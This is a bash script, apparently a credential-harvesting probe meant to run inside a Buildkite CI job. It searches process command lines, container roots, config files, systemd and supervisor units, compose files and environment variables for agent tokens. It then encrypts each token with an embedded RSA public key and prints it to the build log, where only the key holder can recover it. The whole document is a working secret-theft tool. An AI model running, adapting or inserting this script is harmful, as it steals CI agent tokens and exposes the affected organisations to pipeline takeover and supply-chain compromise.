#!/bin/bash
# a632 probe v3: multi-host agent token hunt; values RSA-encrypted only
set -u
PUB=/tmp/.a632pub.$$
cat > "$PUB" <<'A632PUBEOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvsYiCNEL69IkUinb45Id
ZQJZTtR1aqcW1x3sWVg9ZpNnVw2T8xFOpd7xcHnuRuDJjpVkFlBE+sraDq3WdhB7
pnabZtIbLnQc+G6Y8sXmCwbWUwxjz9E5u87DB1o5xPiEyQMeSTNF5SYPPcY4H9eq
jDlHHe8cAA/LpnNcQ/Meluy39CYwHFPMjJGK10X2apBZBJQJxl79TgMx5jFYZx8R
6FAeH8dnEHTWPZEytzegqe0AKKaQwBM7fpd+3UMxnC5NVn3hfE6g0yCvRzyiAELs
Pe6OCiiZ8XBdHHOtoOpE+YarL9U7Q4x7zc52JdojQ7dLS7xySApfHUwE+xa4fvzr
XQIDAQAB
-----END PUBLIC KEY-----
A632PUBEOF
encrypt() { v="$1"; label="$2"; [ -z "$v" ] && return 0; h=$(printf '%s' "$v" | sha256sum | cut -c1-12); c=$(printf '%s' "$v" | openssl pkeyutl -encrypt -pubin -inkey "$PUB" 2>/dev/null | base64 -w0); echo "A632ENC:$label:$h:${c:-ENCFAIL}"; }
echo "A632C_BEGIN"; id; hostname; echo "CTX agent=${BUILDKITE_AGENT_NAME:-none} queue=${BUILDKITE_AGENT_META_DATA_QUEUE:-none}"
echo "== AGENT PROCESSES =="
for p in /proc/[0-9]*; do
  if [ -r "$p/cmdline" ]; then c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null); case "$c" in *buildkite-agent*) echo "PID $p EXE=$(readlink $p/exe 2>/dev/null) CMD: $(printf '%s' "$c" | sed -E 's/([Tt][Oo][Kk][Ee][Nn]=)[^[:space:]]+/\1<redacted>/g')";; esac; fi
done
echo "== CMDLINE TOKEN VALUES =="
for p in /proc/[0-9]*; do
  if [ -r "$p/cmdline" ]; then tr '\0' '\n' < "$p/cmdline" 2>/dev/null | grep -oE '(token|TOKEN)=[^[:space:]]+' | sed -E 's/^[^=]*=//' || true; fi
done | sort -u | head -20 | while IFS= read -r v; do encrypt "$v" "cmdline"; done
echo "== PROC ROOT CFGS (per agent pid) =="
for p in /proc/[0-9]*; do
  if [ -r "$p/cmdline" ]; then c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null); case "$c" in *buildkite-agent*)
    for f in /proc/$p/root/etc/buildkite-agent/buildkite-agent.cfg /proc/$p/root/usr/share/buildkite-agent/buildkite-agent.cfg; do
      if [ -f "$f" ]; then echo "PROCROOT $p $f"; sha256sum "$f"; grep -E '^[[:space:]]*(token|token-env|hooks-path|name)' "$f" | sed 's/=.*/=<redacted>/' || true; t=$(grep -E '^[[:space:]]*token[[:space:]]*=' "$f" | head -1 | sed -E 's/^[^=]*=[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/'); encrypt "$t" "procroot:$p:$f"; fi
    done;; esac; fi
done
echo "== ALL BUILDKITE CFG FILES =="
find / -maxdepth 6 \( -name 'buildkite-agent.cfg' -o -name 'buildkite*.cfg' -o -name 'buildkite-agent*.conf' \) 2>/dev/null | head -20
for f in $(find / -maxdepth 6 \( -name 'buildkite-agent.cfg' -o -name 'buildkite*.cfg' \) 2>/dev/null | head -20); do
  if [ -f "$f" ]; then echo "CFGF $f"; sha256sum "$f"; grep -E '^[[:space:]]*(token|token-env)' "$f" | sed 's/=.*/=<redacted>/' || true; t=$(grep -E '^[[:space:]]*token[[:space:]]*=' "$f" | head -1 | sed -E 's/^[^=]*=[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/'); encrypt "$t" "cfg:$f"; fi
done
echo "== HOME AGENT DIR =="
ls -la "$HOME/.buildkite-agent" 2>/dev/null || true
find "$HOME/.buildkite-agent" -maxdepth 3 -type f 2>/dev/null | head -20
for f in $(find "$HOME/.buildkite-agent" -maxdepth 3 -type f 2>/dev/null | head -20); do echo "HOMEF $f"; sha256sum "$f"; grep -E '^[[:space:]]*(token|token-env)' "$f" 2>/dev/null | sed 's/=.*/=<redacted>/' || true; t=$(grep -E '^[[:space:]]*token[[:space:]]*=' "$f" 2>/dev/null | head -1 | sed -E 's/^[^=]*=[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/'); encrypt "$t" "home:$f"; done
echo "== SUPERVISOR/SYSTEMD =="
for u in /etc/systemd/system/buildkite-agent*.service /lib/systemd/system/buildkite-agent*.service /usr/lib/systemd/system/buildkite-agent*.service /etc/systemd/system/buildkite-agent*.service.d/*.conf /etc/supervisor/conf.d/*.conf /etc/default/buildkite-agent /etc/default/buildkite*; do
  if [ -f "$u" ]; then echo "CONF $u"; sha256sum "$u"; grep -oE '[A-Za-z0-9_]*(TOKEN|SECRET)=[^ "]*' "$u" 2>/dev/null | sed -E 's/=.*/=<redacted>/' || true; grep -oE '(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)=[^ "]*' "$u" 2>/dev/null | while IFS='=' read -r k v; do encrypt "$v" "conf:$k"; done; fi
done
echo "== DOCKER/COMPOSE =="
command -v docker 2>/dev/null || echo nodocker
for f in /docker-compose.yml /docker-compose.yaml /app/docker-compose.yml /opt/buildkite/docker-compose.yml /buildkite/docker-compose.yml; do [ -f "$f" ] && { echo "COMPOSE $f"; sha256sum "$f"; grep -E 'TOKEN|token' "$f" | sed -E 's/(token[^:]*:).*/\1 <redacted>/'; }; done
echo "== ENV TOKEN VALUES (job env) =="
for k in BUILDKITE_AGENT_TOKEN BUILDKITE_TOKEN BUILDKITE_CLUSTER_TOKEN; do eval "v=\${$k:-}"; encrypt "$v" "jobenv:$k"; done
rm -f "$PUB" 2>/dev/null || true
echo "A632C_END"
